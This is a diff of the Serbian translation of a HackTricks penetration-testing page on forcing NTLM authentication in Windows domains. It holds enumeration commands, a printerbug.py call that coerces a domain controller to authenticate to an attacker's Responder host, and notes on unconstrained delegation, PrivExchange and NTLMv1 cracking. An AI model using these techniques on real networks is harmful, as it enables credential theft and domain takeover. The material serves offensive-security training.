@@ -1,15 +1,15 @@
 # Force NTLM Privileged Authentication
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -17,22 +17,22 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **okidača za daljinsku autentifikaciju** napisanih u C# koristeći MIDL kompajler kako bi se izbegle zavisnosti od trećih strana.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **okidača za daljinsku autentifikaciju** kodiranih u C# koristeći MIDL kompajler kako bi se izbegle zavisnosti od trećih strana.
 
 ## Zloupotreba Spooler Servisa
 
-Ako je _**Print Spooler**_ servis **omogućen,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampača na kontroleru domena **ažuriranje** o novim poslovima štampe i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
-Napomena: kada štampač pošalje obaveštenje nekom proizvoljnom sistemu, mora da se **autentifikuje** prema tom **sistemu**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje prema proizvoljnom sistemu, a servis će **koristiti računar kao nalog** u ovoj autentifikaciji.
+Ako je _**Print Spooler**_ servis **omogućen,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampačkog servera domen kontrolera **ažuriranje** o novim poslovima štampe i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
+Napomena: kada štampač pošalje obaveštenje proizvoljnim sistemima, mora da se **autentifikuje** prema tom **sistemu**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje prema proizvoljnom sistemu, a servis će **koristiti račun računara** u ovoj autentifikaciji.
 
 ### Pronalaženje Windows Servera na domenu
 
-Koristeći PowerShell, dobijte listu Windows mašina. Serveri su obično prioritet, pa hajde da se fokusiramo na njih:
+Koristeći PowerShell, dobijte listu Windows mašina. Serveri su obično prioritet, pa se fokusirajmo na njih:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Pronalaženje Spooler usluga koje slušaju
+### Finding Spooler services listening
 
-Koristeći malo modifikovani @mysmartlogin-ov (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler usluga sluša:
+Koristeći malo modifikovani @mysmartlogin-ov (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler servis sluša:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -54,7 +54,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Kombinovanje sa Neograničenom Delegacijom
 
-Ako je napadač već kompromitovao računar sa [Neograničenom Delegacijom](unconstrained-delegation.md), napadač bi mogao **da natera štampač da se autentifikuje protiv ovog računara**. Zbog neograničene delegacije, **TGT** računa **računara štampača** će biti **sačuvan u** **memoriji** računara sa neograničenom delegacijom. Pošto je napadač već kompromitovao ovaj host, moći će da **izvuče ovu kartu** i zloupotrebi je ([Pass the Ticket](pass-the-ticket.md)).
+Ako je napadač već kompromitovao računar sa [Neograničenom Delegacijom](unconstrained-delegation.md), napadač bi mogao **naterati štampač da se autentifikuje protiv ovog računara**. Zbog neograničene delegacije, **TGT** **računarskog naloga štampača** će biti **sačuvan u** **memoriji** računara sa neograničenom delegacijom. Kako je napadač već kompromitovao ovaj host, moći će da **dobije ovu kartu** i zloupotrebi je ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Prisilna autentifikacija
 
@@ -64,7 +64,7 @@ Ako je napadač već kompromitovao računar sa [Neograničenom Delegacijom](unco
 
 Napad `PrivExchange` je rezultat greške pronađene u **Exchange Server `PushSubscription` funkciji**. Ova funkcija omogućava da Exchange server bude primoran od strane bilo kog korisnika domena sa poštanskim sandučetom da se autentifikuje na bilo kojem hostu koji obezbeđuje klijent preko HTTP-a.
 
-Podrazumevano, **Exchange servis radi kao SYSTEM** i ima prekomerne privilegije (konkretno, ima **WriteDacl privilegije na domen pre-2019 Kumulativno Ažuriranje**). Ova greška se može iskoristiti da omogući **preusmeravanje informacija na LDAP i naknadno ekstraktovanje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog napada omogućava trenutni pristup Administratoru Domena sa bilo kojim autentifikovanim korisničkim nalogom domena.
+Podrazumevano, **Exchange usluga se pokreće kao SYSTEM** i dobija prekomerne privilegije (konkretno, ima **WriteDacl privilegije na domen pre-2019 Kumulativno Ažuriranje**). Ova greška se može iskoristiti za omogućavanje **preusmeravanja informacija na LDAP i naknadno vađenje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog napada omogućava trenutni pristup Administratoru Domena sa bilo kojim autentifikovanim korisničkim nalogom domena.
 
 ## Unutar Windows-a
 
@@ -116,18 +116,18 @@ Ako možete da izvršite MitM napad na računar i ubacite HTML u stranicu koju �
 ## Cracking NTLMv1
 
 Ako možete uhvatiti [NTLMv1 izazove pročitajte ovde kako ih probiti](../ntlm/#ntlmv1-attack).\
-_Pametite da da biste probili NTLMv1 morate postaviti Responder izazov na "1122334455667788"_
+&#xNAN;_&#x52;emite da je potrebno postaviti Responder izazov na "1122334455667788"_
 
 {% hint style="success" %}
-Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
